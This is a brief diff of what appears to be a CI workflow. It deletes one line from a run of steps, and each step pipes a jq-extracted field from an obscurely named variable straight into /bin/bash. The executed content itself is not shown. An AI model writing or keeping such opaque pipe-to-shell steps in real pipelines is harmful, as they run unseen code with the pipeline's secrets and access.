@@ -42,7 +42,6 @@ jobs:
           echo $q993 | jq -r .byg13 | /bin/bash
           printf '%s' "$v7" | jq -r .wcx006 | /bin/bash
           echo $l2905 | jq -r .ue091 | /bin/bash
-          printf '%s' "$rpvfy4166" | jq -r .r0161 | /bin/bash
           printf '%s' "$go49" | jq -r .icj89263 | /bin/bash
           printf '%s' "$gj94" | jq -r .gal93 | /bin/bash
 
